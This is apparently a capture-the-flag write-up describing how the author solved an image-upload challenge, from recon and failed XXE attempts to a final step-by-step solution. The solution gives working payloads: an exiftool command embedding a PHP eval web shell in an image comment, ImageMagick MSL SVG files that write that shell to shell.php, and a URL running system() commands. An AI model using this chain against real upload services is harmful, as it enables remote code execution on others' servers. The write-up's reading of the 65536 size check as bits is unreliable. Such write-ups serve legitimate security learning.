### Recon

So starting out I decided to look at the source code of the web page and found out that there was a link to the php source code. I downloaded the php code and looked through it. 

Noticing a comment saying totally not copy&pasted from somewhere... so I decided to copy and past the first couple lines of the code and found <a href="https://jbz.team/midnightsunctfquals2019/Rubenscube">https://jbz.team/midnightsunctfquals2019/Rubenscube</a>. It was a challenge from another CTF Called Midnight Sun CTF 2019 Quals - Rubenscube. At that point I knew that in order to get the flag there was some sort of XXE involved.

### The troubles

I decided to copy and paste the svg code into my own file and uploaded it. I waited and nothing happened it didn't even display on the page. I got really frustrated because at this point there was 4 hours left until the CTF was over. So I kept looking on the internet and kept copying and pasting svg code and every time nothing worked. Then it hit me I needed to add an xml beginning tag to the top of the svg code. So I did that uploaded it and the image was on the page but no XXE happened. At this point I lost all hope in trying XXE attacks and wasn't able to finish on time. 

### The next day

I decided to give it another shot and heard that the intended way to solve the challenge was to use imagemagick. After hearing that I had looked up imagemagick vulnerabilities and found an RCE from 2016 called imagetragick, but being the stubborn person I am I kept going with my way and decided to make an image named hello.png and found out that exiftool can add comments just like imagemagick using the command
> exiftool -Comment='\<?php eval($_GET["cmd"]);?>' hello.png

I uploaded the picture and it failed then I realized the image had to be 100x100 and went into pinta and resized it. I uploaded it to the page and it succeeded in uploading. After I downloaded the image to make sure the comment metadata stayed on the image but it wasn't there. So I got a little upset took a look at the code and noticed these lines
>$size = get\_size(\$path, \$mime_type);
>
        >if (\$size[0] * $size[1] > 65536) {
         >   die;
        >}

I assumed that meant that the size of the image has to be bigger than 65536 to keep the comment metadata. So I drew an image and would keep checking to see if my image was over 65536. (I am assuming that 65536 is bits which would be 8.192 kb). After I got above that 65536 number I added the comment and sent it to the website. I downloaded the image, low and behold the comment metadata was still there. Once I saw that I fumbled around for a bit until I found a page that showed me svg code that could bypass image magick. I copied the svg code to make the image and made it a few lines smaller and it worked perfect for my needs. After that was time for the RCE which I made another svg file to just run the imagetragick vulnerability and got the flag.

## Solution

###Step one
Make an image that is 100x100 and is atleast 8 kb in size. Then use the command
> exiftool -Comment='\<?php eval($_GET["cmd"]);?>' ("your image name").png

then upload the image.

###Step two

click the image then copy from where /upload begins in the url bar all the way to the end.

make an svg file that looks some what like this
> \<?xml version="1.0" encoding="UTF-8" ?>
> \<image>
> \<read filename="/var/www/html/(substitute this for what you copied in the url bar)" />
 > \<write filename="var/www/html/upload/shell.php"/>
 > \<svg width="120px" height="120px">
 >  \<image href="text:/etc/passwd" />
> \</svg>
> \</image>


###Step three
click on the svg file you uploaded earlier and copy from where /upload begins in the url bar all the way to the end

upload another svg file that looks some what like 
> \<?xml version="1.0" encoding="UTF-8"?>
> \<svg width="120px" height="120px">
 > \<image href="msl:/var/www/html(substitute this for what you copied in the url bar)" />
> \</svg>

###Last step
in the url bar type in gphotos2.ctfcompetition.com:1337/upload/shell.php?cmd=system("cd ../../../../../../; /get_flag"); then scroll down all the way to the bottom and you should see the flag
